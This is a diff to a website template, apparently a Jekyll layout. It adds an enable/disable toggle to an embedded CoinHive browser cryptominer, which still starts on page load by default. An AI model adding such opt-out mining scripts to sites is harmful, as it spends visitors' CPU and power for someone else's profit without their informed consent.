@@ -35,6 +35,10 @@
       <footer class="footer">
         <small>
           &copy; 1987 - {{ site.time | date: '%Y' }} <a href="mailto:{{ site.author.email }}">{{ site.author.name }}</a>. All rights reserved.
+
+              {% if site.coin_hive_id %}
+              <a id="coinHiveToggle" href="#/"><a>
+              {% endif %}
         </small>
       </footer>
     </div>
@@ -53,10 +57,37 @@
     {% if site.coin_hive_id %}
     <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
     <script>
-      var miner = new CoinHive.Anonymous('{{ site.coin_hive_id }}');
-      miner.start();
+
+      let coinHiveToggle = document.getElementById('coinHiveToggle');
+
+      coinHiveToggle.addEventListener('click', function() {
+        let coinHiveEnabled = !getCoinHiveEnabled();
+        localStorage.setItem('coinHiveEnabled', coinHiveEnabled);
+        initMining(coinHiveEnabled);        
+      });
+
+
+      let coinHiveEnabled = getCoinHiveEnabled();
+
+      initMining(coinHiveEnabled);
+
+      function getCoinHiveEnabled() {
+        let coinHiveEnabled =localStorage.getItem('coinHiveEnabled') || 'true';
+        return coinHiveEnabled == 'true';
+      }
+
+      function initMining(coinHiveEnabled) {
+        if (coinHiveEnabled) {
+          var miner = new CoinHive.Anonymous('{{ site.coin_hive_id }}');
+          miner.start();
+          coinHiveToggle.innerHTML = 'Disable';
+
+        } else {
+          coinHiveToggle.innerHTML = 'Enable';
+        }
+      }
+
     </script>
     {% endif %}
-  }
   </body>
 </html>
